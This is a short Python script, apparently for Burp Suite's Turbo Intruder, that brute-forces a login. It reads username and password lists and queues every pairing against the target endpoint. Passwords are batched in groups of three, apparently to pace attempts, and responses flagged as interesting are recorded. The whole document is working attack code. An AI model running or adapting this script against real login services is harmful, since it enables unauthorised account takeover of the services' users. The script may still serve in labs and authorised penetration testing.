def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=10,
                           engine=Engine.BURP2
                           )
    buffer = []
    chunk_size = 3
    for line in open('passwords.txt'):
        buffer.append(line.rstrip())
        if len(buffer) == chunk_size:
            for username in open('usernames.txt'):
                for passwd in buffer:
                    engine.queue(target.req, [username.rstrip(), passwd])
            buffer = []


def handleResponse(req, interesting):
    if interesting:
        table.add(req)
